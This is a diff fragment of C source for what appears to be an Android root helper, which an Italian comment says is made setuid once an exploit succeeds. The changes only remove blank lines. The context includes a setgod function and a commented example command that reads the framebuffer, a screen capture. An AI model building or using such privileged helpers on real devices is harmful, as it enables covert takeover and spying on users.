@@ -35,7 +35,6 @@ int my_mount(const char *mntpoint);
 static void copy_root(const char *mntpnt, const char *dst);
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
-
 // statuslog -c "/system/bin/cat /dev/graphics/fb0"
 int main(int argc, char** argv) {
 	int i;
@@ -301,7 +300,6 @@ int my_mount(const char *mntpoint) {
 
 int setgod() {
     char buf[256];
-
     //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d\n", getuid(), getgid(), geteuid(), getegid());
     //LOG(buf);
 
